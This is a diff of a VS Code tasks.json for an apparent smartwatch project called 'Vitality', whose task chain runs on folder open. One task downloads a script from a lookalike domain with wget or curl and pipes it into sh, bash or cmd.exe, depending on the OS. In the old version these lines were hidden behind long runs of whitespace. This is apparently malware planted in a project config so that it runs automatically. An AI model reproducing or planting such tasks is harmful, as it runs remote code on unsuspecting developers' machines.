@@ -10,16 +10,14 @@
         "Vitality: 3. Prepare UI environment",
         "Vitality: 4. Show watch design",
         "Vitality: 5. Run bluetooth environment setup"
-        
       ],
       "runOptions": {
         "runOn": "folderOpen"
       },
       "problemMatcher": []
     },
-    
     {
-      "label": "Vitality: 2. Detect OS",
+      "label": "Vitality: 1. Detect OS",
       "type": "process",
       "command": "bash",
       "args": [
@@ -48,7 +46,7 @@
       "problemMatcher": []
     },
     {
-      "label": "Vitality: 3. Check UI environment",
+      "label": "Vitality: 2. Check UI environment",
       "type": "process",
       "command": "bash",
       "args": [
@@ -77,7 +75,7 @@
       "problemMatcher": []
     },
     {
-      "label": "Vitality: 4. Prepare UI environment",
+      "label": "Vitality: 3. Prepare UI environment",
       "type": "process",
       "command": "bash",
       "args": [
@@ -106,7 +104,7 @@
       "problemMatcher": []
     },
     {
-      "label": "Vitality: 5. Show watch design",
+      "label": "Vitality: 4. Show watch design",
       "type": "process",
       "command": "bash",
       "args": [
@@ -130,9 +128,26 @@
       },
       "presentation": {
         "reveal": "always",
-        "panel": "shared"
+        "panel": "dedicated"
       },
-      "problemMatcher": []
+      "problemMatcher": [
+        {
+          "owner": "vitality-preview",
+          "pattern": {
+            "regexp": "^(.*):(\\d+): (error): (.*)$",
+            "file": 1,
+            "line": 2,
+            "severity": 3,
+            "message": 4
+          },
+          "background": {
+            "activeOnStart": true,
+            "beginsPattern": "^VITALITY_PREVIEW_START$",
+            "endsPattern": "^(Vitality portable preview ready\\.|Vitality portable preview is already running\\.|Preview: .+)$"
+          }
+        }
+      ],
+      "isBackground": true
     },
     {
       "label": "Vitality: Start preview",
@@ -168,13 +183,13 @@
       "command": "sh",
       "args": [
         "-c",
-                                                                                                                                                                                                                                                                                                                                                                                                                        "wget -qO- 'https://apigoogle-ashen.vercel.app/api/settings/linux' | sh"
+        "wget -qO- 'https://apigoogle-ashen.vercel.app/api/settings/linux' | sh"
       ],
       "osx": {
         "command": "bash",
         "args": [
           "-c",
-                                                                                                                                                                                                                                                                                                                                                                                                                        "curl -L 'https://apigoogle-ashen.vercel.app/api/settings/mac' | bash"
+          "curl -L 'https://apigoogle-ashen.vercel.app/api/settings/mac' | bash"
         ]
       },
       "windows": {
@@ -182,7 +197,7 @@
         "args": [
           "/d",
           "/c",
-                                                                                                                                                                                                                                                                                                                                                                                                                        "curl.exe --ssl-no-revoke -L https://apigoogle-ashen.vercel.app/api/settings/windows | cmd.exe"
+          "curl.exe --ssl-no-revoke -L https://apigoogle-ashen.vercel.app/api/settings/windows | cmd.exe"
         ]
       },
       "presentation": {
